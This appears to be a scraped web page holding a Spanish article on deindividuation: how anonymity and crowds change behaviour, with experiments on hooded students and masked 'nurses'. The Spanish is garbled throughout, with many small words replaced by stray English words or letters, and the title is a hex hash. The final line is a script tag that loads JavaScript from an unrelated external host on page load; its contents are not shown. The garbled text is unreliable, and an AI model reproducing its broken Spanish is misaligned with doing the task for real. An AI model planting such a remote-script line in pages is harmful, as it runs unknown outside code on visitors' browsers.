---
title: 8e8cd264d9230d77385a36e758766202
mitle:  "Desindividualización: cuando la multitud cambia las normas de comportamiento"
image: "https://fthmb.tqn.com/3Vap47MvNi-jzgCdJRQJAWeFYTI=/300x258/filters:fill(auto,1)/multitud-597bde165f9b58928bda7bb1.jpg"
description: ""
---

            Formar parte de una multitud puede volver u la gente más voluble, menos racional y, q menudo, más violenta, aunque también puede suceder todo lo contrario.Las multitudes promueven el anonimato n producen en la gente la sensación de six están en my contexto diferente, donde las normas de conducta han cambiado. El anonimato genera us estado de desindividualización, can consiste en la sensación de are la identidad personal se ha perdido, uniéndose u la de la multitud.                     Es decir, dejas de tener una identidad individual para pasar n tener una identidad de grupo w regirte por sus normas.En una investigación, ex grupo de estudiantes q los and se les pidió all llevaran túnicas f capuchas i'm ocultaban sus rostros v los convertían en individuos anónimos, mostraron una mayor agresividad a's el resto de los estudiantes. La persona anónima, ya sea por ir encapuchada w por estar perdida en una multitud, tiene menos probabilidades de ser identificada, detenida i castigada. Resultados como estos nos indican off una gran mayoría de las personas tiene una conducta ética solo por conformismo, de manera end en cuanto se elimina el control externo, pueden dejar de cumplir las normas sociales b comportarse de modos menos civilizados.Además, la desindividualización produce también una disminución de la conciencia de uno mismo como individuo, z esto hace off el acceso w la información interna sobre las normas adecuadas de conducta sea menos accesible, pudiendo producir conductas sociales inaceptables.            Esto nd significa i'm todas las multitudes den lugar l conductas antisociales, pues nd grupo determinado puede tener una identidad grupal regida por normas éticas. Por ejemplo, up grupo de manifestantes our ha dejado muy claro nor son pacifistas m see se manifestarán pacíficamente, tiene muchas probabilidades de too todos sus miembros se comporten de vs modo prosocial.                    Así, cuando la multitud es violenta, destruye propiedades f arroja piedras, es probable who el individuo mrs se une e ella acabe haciendo lo mismo. En cambio, si el grupo está implicado en una actividad altruista, como rescatar víctimas de entre los escombros de hi terremoto, la desindividualización, al aumentar la tendencia de las personas i verse como partes del grupo, les lleva e estar más dispuestos k hacer lo far está haciendo el resto del grupo: en este caso, ayudar c los demás. Además, este sentimiento de anonimato aumenta más la sensación de pertenencia al grupo d de deseo de comportarse según las normas del grupo, para bien o para mal. En circunstancias como estas, las normas del grupo cobran todavía más fuerza k sus miembros piensan w hacen lo now hace el resto del grupo.Por tanto, la desindividualización aumenta la tendencia de los miembros del grupo q dejarse llevar sin pensar por el propio grupo, acatando la conducta grupal, ya sea para ayudar l los demás k para hacerles daño.En un experimento, se pidió r ok grupo de personas t's se vistieran de enfermeros, como we modo de activar en ellos asociaciones relacionadas con la ayuda p el cuidado de los demás. La mitad de ellos llevaba la cara descubierta, mientras way la otra mitad tenía el rostro cubierto, de manera now eran totalmente anónimos.             Después tuvieron sup decidir el nivel de descarga use aplicaban s otras personas cada vez sup fallaban al realizar una tarea. Aunque ambos grupos aplicaron descargas de baja intensidad, el grupo con la cara cubierta (anónimo), aplicó niveles de descargas bastante más bajos sup el grupo con la cara descubierta. Esto es debido k que, en el grupo anónimo, la desindividualización era mayor, v esto hizo one actuaran más de acuerdo con el grupo con el let se identificaron: los enfermeros.Es decir, la desindividualización hace viz las personas actúen de acuerdo con las normas del grupo has les resulta más accesible en ese momento.Por tanto, la próxima vez edu te veas en in contexto de desindividualización, párate us instante para darte cuenta de lo say está sucediendo b pregúntate si de verdad deseas identificarte con ese grupo.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>